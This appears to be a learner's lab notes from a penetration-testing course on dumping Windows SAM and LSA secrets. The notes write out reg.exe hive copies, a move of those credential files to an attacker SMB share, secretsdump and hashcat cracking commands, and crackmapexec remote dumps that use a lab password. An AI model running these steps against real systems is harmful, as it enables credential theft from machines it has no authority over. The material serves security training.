With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. Doing this offline will ensure we can continue to attempt our attacks without maintaining an active session with a target. Let's walk through this process together using a target host. Feel free to follow along by spawning the target box in this section. 
[[Attacking LSASS]]

#sam

## Copying SAM Registry Hives

|Registry Hive|Description|
|---|---|
|`hklm\sam`|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|`hklm\system`|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|`hklm\security`|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|

#### Using reg.exe save to Copy Registry Hives

>Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:

```C
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

#reg_exe #cmd #sam 
## Creating a Share with smbserver.py

>All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (`CompData`) and specify the directory on our attack host where the share will be storing the hive copies (`/home/path to the folder/Documents`). 


```
$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/path to the folder/Documents/
```

#impacket #secretsdump
#### Moving Hive Copies to Share

```c
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

#cmd #sam #sam_transfer

#### Dumping Hashes with Impacket's secretsdump.py

> One incredibly useful tool we can use to dump the hashes offline is Impacket's `secretsdump.py`. Impacket can be found on most modern penetration testing distributions. We can check for it by using `locate` on a Linux-based system:

```
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Formatting for the dumped data  `Dumping local SAM hashes (uid:rid:lmhash:nthash)`

#impacket #secretsdump #dumping 


## Cracking Hashes with Hashcat

>Once we have the hashes, we can start attempting to crack them using [Hashcat](https://hashcat.net/hashcat/). We will use it to attempt to crack the hashes we have gathered. If we take a glance at the Hashcat website, we will notice support for a wide array of hashing algorithms. In this module, we use Hashcat for specific use cases. This should help us develop the mindset & understanding to use Hashcat as well as know when we need to reference Hashcat's documentation to understand what mode and options we need to use depending on the hashes we capture.

#### Adding nthashes to a .txt File

```
$ sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```

#### Running Hashcat against NT Hashes

>Hashcat has many different modes we can use. Selecting a mode is largely dependent on the type of attack and hash type we want to crack. Covering each mode is beyond the scope of this module. We will focus on using `-m` to select the hash type `1000` to crack our NT hashes (also referred to as NTLM-based hashes). We can refer to Hashcat's [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes) or the man page to see the supported hash types and their associated number. We will use the infamous rockyou.txt wordlist mentioned in the `Credential Storage` section of this module.

```
$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

#hashcat #password_mutations #cracking


## Remote Dumping & LSA Secrets Considerations

>With access to credentials with `local admin privileges`, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.

#### Dumping LSA Secrets Remotely 
```
$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

#### Dumping SAM Remotely
We can also dump hashes from the SAM database remotely.
```
$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

#crackmapexec #smb #lsa #dumping #sam 
